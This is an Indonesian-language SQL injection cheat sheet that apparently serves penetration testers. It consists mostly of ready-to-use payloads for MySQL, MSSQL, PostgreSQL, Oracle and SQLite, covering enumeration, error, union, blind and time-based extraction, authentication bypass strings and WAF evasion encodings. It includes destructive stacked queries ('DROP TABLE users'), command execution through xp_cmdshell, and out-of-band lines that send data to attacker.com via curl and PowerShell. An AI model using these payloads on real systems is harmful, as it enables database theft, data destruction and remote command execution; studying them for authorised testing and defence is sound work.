# Cheatsheet Serangan SQL Injection

> **Peringatan:** Informasi ini ditujukan untuk tujuan pendidikan, pengujian penetrasi yang sah, dan riset keamanan. Menggunakan teknik ini pada sistem tanpa izin eksplisit adalah ilegal dan tidak etis.

---

## 1. Pengumpulan Informasi (Information Gathering)

| Deskripsi                              | Database          | Payload                                                                                        |
| -------------------------------------- | ----------------- | ---------------------------------------------------------------------------------------------- |
| Mendapatkan Versi Database             | MySQL, MSSQL      | `SELECT @@version`                                                                             |
|                                        | PostgreSQL        | `SELECT version()`                                                                             |
|                                        | Oracle            | `SELECT * FROM v$version`                                                                      |
| Mendapatkan Nama Database Saat Ini     | MySQL             | `SELECT database()`                                                                            |
|                                        | MSSQL             | `SELECT DB_NAME()`                                                                             |
|                                        | PostgreSQL        | `SELECT current_database()`                                                                    |
|                                        | Oracle            | `SELECT ora_database_name FROM dual`                                                           |
|                                        | SQLite            | `SELECT file FROM "main.db"`                                                                   |
| Mendapatkan User Database Saat Ini     | MySQL             | `SELECT user()`                                                                                |
|                                        | MSSQL             | `SELECT system_user`                                                                           |
|                                        | PostgreSQL        | `SELECT current_user`                                                                          |
|                                        | Oracle            | `SELECT user FROM dual`                                                                        |
| Mendaftar Semua Database               | MySQL, PostgreSQL | `SELECT schema_name FROM information_schema.schemata`                                          |
|                                        | MSSQL             | `SELECT name FROM master..sysdatabases`                                                        |
|                                        | MSSQL (2005+)     | `SELECT name FROM sys.databases`                                                               |
|                                        | Oracle            | `SELECT username FROM all_users`                                                               |
| Mendaftar Tabel dari Database Tertentu | MySQL, PostgreSQL | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'nama_database'`        |
|                                        | MSSQL             | `SELECT name FROM nama_database..sysobjects WHERE xtype = 'U'`                                 |
|                                        | Oracle            | `SELECT table_name FROM all_tables WHERE owner = 'NAMA_DATABASE'`                              |
|                                        | SQLite            | `SELECT name FROM sqlite_master WHERE type='table'`                                            |
| Mendaftar Kolom dari Tabel Tertentu    | MySQL, PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE table_name = 'nama_tabel'`           |
|                                        | MSSQL             | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'nama_tabel')` |
|                                        | Oracle            | `SELECT column_name FROM all_tab_columns WHERE table_name = 'NAMA_TABEL'`                      |
|                                        | SQLite            | `PRAGMA table_info('nama_tabel')`                                                              |

> **Catatan untuk Oracle:**
>
> - Pada database Oracle, hampir semua query membutuhkan klausa `FROM`, bahkan untuk operasi sederhana seperti `SELECT 1 FROM dual`. Tabel khusus `DUAL` digunakan untuk menghasilkan satu baris data dan biasanya dipakai untuk operasi tanpa tabel nyata.
> - Contoh: `SELECT 1 FROM dual` atau `SELECT user FROM dual`.
> - Berbeda dengan MySQL/PostgreSQL yang bisa langsung `SELECT 1` tanpa `FROM`.

### Khusus Oracle: Tabel DUAL

Tabel `DUAL` adalah tabel khusus di Oracle yang digunakan untuk query yang tidak membutuhkan tabel nyata. Contoh penggunaan:

```sql
SELECT 1 FROM dual;
SELECT 'Hello' FROM dual;
SELECT NULL FROM dual;
```

Pada Oracle, hampir semua query membutuhkan klausa `FROM`, tidak seperti MySQL/PostgreSQL yang bisa langsung `SELECT 1` tanpa `FROM`.

---

## 2. Fungsi & Sintaks Spesifik Database

### a. Komentar (Comments)

| Database   | Sintaks                                   | Contoh                                    |
| ---------- | ----------------------------------------- | ----------------------------------------- |
| MySQL      | `#` atau `--` _(dengan spasi setelahnya)_ | `SELECT * FROM users WHERE id = '1' -- -` |
| PostgreSQL | `--`                                      | `SELECT * FROM users WHERE id = '1' --`   |
| MSSQL      | `--`                                      | `SELECT * FROM users WHERE id = '1' --`   |
| Oracle     | `--`                                      | `SELECT * FROM users WHERE id = '1' --`   |
| SQLite     | `--`                                      | `SELECT * FROM users WHERE id = '1' --`   |

### b. Penggabungan String (String Concatenation)

| Database   | Sintaks                   | Contoh                      |
| ---------- | ------------------------- | --------------------------- |
| MySQL      | `CONCAT(str1, str2, ...)` | `CONCAT('user:', username)` |
| PostgreSQL | `str1 \|\| str2`          | `'user:' \|\| username`     |
| MSSQL      | `str1 + str2`             | `'user:' + username`        |
| Oracle     | `str1 \|\| str2`          | `'user:' \|\| username`     |
| SQLite     | `str1 \|\| str2`          | `'user:' \|\| username`     |

### c. Substring

| Database   | Sintaks                                   | Contoh                                      |
| ---------- | ----------------------------------------- | ------------------------------------------- |
| MySQL      | `SUBSTRING(string, start, length)`        | `SUBSTRING('abcdef', 2, 3) -> 'bcd'`        |
| PostgreSQL | `SUBSTRING(string FROM start FOR length)` | `SUBSTRING('abcdef' FROM 2 FOR 3) -> 'bcd'` |
| MSSQL      | `SUBSTRING(string, start, length)`        | `SUBSTRING('abcdef', 2, 3) -> 'bcd'`        |
| Oracle     | `SUBSTR(string, start, length)`           | `SUBSTR('abcdef', 2, 3) -> 'bcd'`           |
| SQLite     | `SUBSTR(string, start, length)`           | `SUBSTR('abcdef', 2, 3) -> 'bcd'`           |

### d. Query Limit (Membatasi Jumlah Hasil)

| Database   | Sintaks Limit                                                 | Contoh                                                                                                   |
| ---------- | ------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| MySQL      | `LIMIT n OFFSET m`                                            | `SELECT * FROM users LIMIT 5 OFFSET 10;`                                                                 |
| PostgreSQL | `LIMIT n OFFSET m`                                            | `SELECT * FROM users LIMIT 5 OFFSET 10;`                                                                 |
| MSSQL      | `SELECT TOP n ...` atau `OFFSET ... FETCH NEXT ... ROWS ONLY` | `SELECT TOP 5 * FROM users;`<br>`SELECT * FROM users ORDER BY id OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY;` |
| Oracle     | `ROWNUM` atau `FETCH FIRST n ROWS ONLY`                       | `SELECT * FROM users WHERE ROWNUM <= 5;`<br>`SELECT * FROM users FETCH FIRST 5 ROWS ONLY;`               |

### e. Conditional Errors (Error-based Condition)

| Database       | Payload                                                                                 |
| -------------- | --------------------------------------------------------------------------------------- |
| **Oracle**     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| **MSSQL**      | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| **MySQL**      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

> **Catatan:** Teknik ini digunakan untuk memicu error hanya jika kondisi tertentu terpenuhi, sehingga dapat digunakan untuk inferensi data secara lebih presisi pada error-based SQLi.

---

## 3. Klasifikasi Teknik Eksploitasi

### a. In-band SQLi (Classic SQLi)

#### i. Error-based SQLi

| Deskripsi             | Payload                                                                              |
| --------------------- | ------------------------------------------------------------------------------------ |
| Versi DB (MSSQL)      | `' AND 1=CONVERT(int, @@version) --`                                                 |
| Versi DB (Oracle)     | `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) --` |
| Versi DB (PostgreSQL) | `' AND 1=(SELECT CAST(version() AS int)) --`                                         |

#### ii. Union-based SQLi

| Deskripsi            | Payload                                                |
| -------------------- | ------------------------------------------------------ |
| Mencari Jumlah Kolom | `' ORDER BY 1--` _(lanjutkan 2, 3, dst. hingga error)_ |
| Ekstraksi Data       | `' UNION SELECT username, password FROM users --`      |

---

### b. Inferential SQLi (Blind SQLi)

#### i. Boolean-Based Blind

| Deskripsi                          | Payload                                                          |
| ---------------------------------- | ---------------------------------------------------------------- |
| Mengecek karakter pertama versi DB | `' AND (SELECT SUBSTRING(version(),1,1)) = '5' --`               |
| Mengecek panjang nama database     | `' AND (SELECT LENGTH(database())) > 10 --` _(MySQL/PostgreSQL)_ |

#### ii. Time-Based Blind

| Deskripsi                      | Payload                                                                                         |
| ------------------------------ | ----------------------------------------------------------------------------------------------- |
| Delay jika benar (MySQL)       | `' AND IF(SUBSTRING(user(),1,1)='d', SLEEP(5), 0) --`                                           |
| Query delay murni (MySQL)      | `SELECT SLEEP(5);`                                                                              |
| Delay jika benar (PostgreSQL)  | `' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END) --` |
| Query delay murni (PostgreSQL) | `SELECT pg_sleep(5);`                                                                           |
| Delay jika benar (MSSQL)       | `; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5' --`                                  |
| Query delay murni (MSSQL)      | `WAITFOR DELAY '0:0:5';`                                                                        |
| Delay jika benar (Oracle)      | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --`                                                   |
| Query delay murni (Oracle)     | `BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',5); END;`                                                  |
| Delay jika benar (SQLite)      | `' AND 1=LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000)))) --`                                      |
| Query delay murni (SQLite)     | `SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000))));`                                         |

---

### c. Out-of-Band (OOB) SQLi

| Deskripsi                  | Payload                                                                                |
| -------------------------- | -------------------------------------------------------------------------------------- |
| DNS Lookup (Windows/MySQL) | `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.nama-domain.com\\a')) --` |
| HTTP Request (Oracle)      | `' AND UTL_HTTP.REQUEST('http://...')`                                                 |
| HTTP Request (MSSQL)       | `; EXEC master..xp_dirtree '\\nama-domain.com\test'; --`                               |

---

## 4. Teknik Tambahan & Bypass

### a. Bypass Filter & WAF

- **Encoding:**
  - URL Encoding: `%27` untuk `'`
  - Double URL Encoding: `%2527`
  - Hex Encoding: `0x61646d696e`
  - Unicode Encoding: `\u0027`
- **Pengganti Spasi:**
  - `/**/`
  - `/*!*/`
  - Tab (`%09`), newline (`%0A`)

### b. Authentication Bypass Payloads

- `' OR '1'='1`
- `' OR 1=1--`
- `' OR 'a'='a'--`
- `' OR 1=1#`

### c. Second-Order SQL Injection

- Data aman saat input bisa berbahaya saat digunakan di query lain, contoh: token reset password yang disimpan di DB dan dipanggil kembali tanpa sanitasi.

### d. Stacked Queries (Multiple Statements)

- MySQL (jika `allow_multi_statements` aktif):  
  `1; DROP TABLE users --`
- MSSQL:  
  `1; EXEC xp_cmdshell('whoami') --`

### e. Advanced Enumeration

- OS dari server: `SELECT @@version_compile_os` _(MySQL)_
- Privilege user: `SELECT super_priv FROM mysql.user WHERE user='root'`

### f. Out-of-Band Lanjutan

- PostgreSQL:  
  `COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=' || version()`
- MSSQL:  
  `; EXEC xp_cmdshell 'powershell Invoke-WebRequest http://attacker.com/?data=...';`

---

## 5. SQL Injection pada Format Khusus

### a. JSON-based SQLi

Contoh bypass pada API:

```json
{ "username": "admin' --", "password": "anything" }
```

### b. GraphQL Injection

Menyisipkan query SQL di field GraphQL yang langsung diteruskan ke DB.

---

## 6. Tools Populer untuk SQL Injection

| Tool               | Deskripsi                                                                  |
| ------------------ | -------------------------------------------------------------------------- |
| **sqlmap**         | Tool open-source paling populer dan kuat untuk otomatisasi SQL Injection.  |
| **jSQL Injection** | Tool berbasis Java dengan GUI untuk mempermudah proses pengujian.          |
| **Burp Suite**     | Proxy serbaguna dengan scanner yang dapat mendeteksi kerentanan SQLi.      |
| **OWASP ZAP**      | Alternatif open-source untuk Burp Suite, bagus untuk menemukan kerentanan. |

---
